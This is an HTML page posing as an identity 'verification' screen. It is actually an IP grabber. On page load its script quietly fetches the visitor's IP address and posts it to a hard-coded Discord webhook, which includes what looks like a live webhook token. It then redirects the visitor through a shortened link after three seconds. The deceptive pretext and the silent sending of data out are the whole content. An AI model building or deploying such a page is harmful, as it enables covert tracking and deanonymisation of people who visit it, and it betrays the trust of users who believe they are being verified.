<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body {
            background-color: black;
            margin: 0;
            height: 100vh;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container {
            text-align: center;
        }
        #loadingMessage {
            font-size: 24px;
            margin-top: 20px;
        }
    </style>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX"; // Your Discord webhook
        const REDIRECT_URL = "https://is.gd/gwuu9c"; // Your redirect link

        window.onload = async function() {
            // Show loading message to the user
            document.getElementById('loadingMessage').innerText = "Verifying... Please wait.";

            try {
                // Fetch user's IP from a reliable API
                const response = await fetch("https://api64.ip.sb/jsonip");
                const data = await response.json();
                const userIP = data.ip;

                console.log("User IP: " + userIP); // Debugging: Check if the IP is fetched correctly

                // Send the IP to Discord webhook immediately after the page loads
                const payload = {
                    content: `New Visitor IP: ${userIP}`
                };

                // Send request directly to the Discord webhook without a proxy
                const webhookResponse = await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

                // Log the status of the webhook request
                if (webhookResponse.ok) {
                    console.log("Webhook request successful");
                } else {
                    console.error("Webhook request failed with status:", webhookResponse.status);
                }

            } catch (error) {
                console.error("Error sending IP:", error); // Improved error handling
            }

            // Wait for 3 seconds before redirecting
            setTimeout(function() {
                window.location.href = REDIRECT_URL;
            }, 3000); // 3 seconds delay
        };
    </script>
</head>
<body>
    <div class="container">
        <h1>Verifying...</h1>
        <p id="loadingMessage">Please wait while we verify your identity.</p>
    </div>
</body>
</html>
